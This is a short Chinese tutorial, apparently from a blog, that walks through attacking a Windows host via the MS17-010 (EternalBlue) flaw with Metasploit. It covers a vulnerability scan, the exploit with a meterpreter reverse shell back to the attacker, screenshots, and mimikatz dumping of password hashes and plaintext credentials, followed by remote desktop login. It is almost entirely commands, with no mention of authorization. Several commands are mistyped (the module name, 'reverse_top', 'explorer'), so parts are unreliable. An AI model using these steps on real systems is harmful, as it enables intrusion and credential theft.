利用Kali系统msfconsole工具对Ms17_010漏洞进行利用

使用步骤

一、打开msfconsole工具并进行相应配置

注意：所有的字符在英文状态下进行输入

1、输入命令：search ms17_010 //搜索漏洞的利用模块

2、输入命令：use auxiliary/scanner/smb/smb_ms17_010

3、输入命令：set RHOSTS ip(被扫描的IP)

4、输入命令：run //进行扫描，查看是否有漏洞

二、进行漏洞攻击

输入以下命令：（逐一进行执行）

1、use exploit/windows/smb/ms17_010_eternablue //加载攻击的模式

2、set RHOST IP （被攻击主机IP） //设置被攻击主机IP

3、set LHOST IP （本地IP） //设置本地IP

4、set LPORT 端口号 //设置连接的端口

5、set payload Windows/x64/meterpreter/reverse_top //设置回链方式

6、explorer //开始攻击

三、执行系统命令

1、sysinfo //爆出系统信息

2、screenshot //截屏，截屏后保存至/root/

四、获取hash破解登录密码

接着输入以下命令

1、load mimikatz

2、help

3、msv //获取hash值

4、ssp //获取的是明文信息

5、wdigest //读取内存中存放的账号密码明文信息

6、kerberos

五、远程登录

rdesktop ip
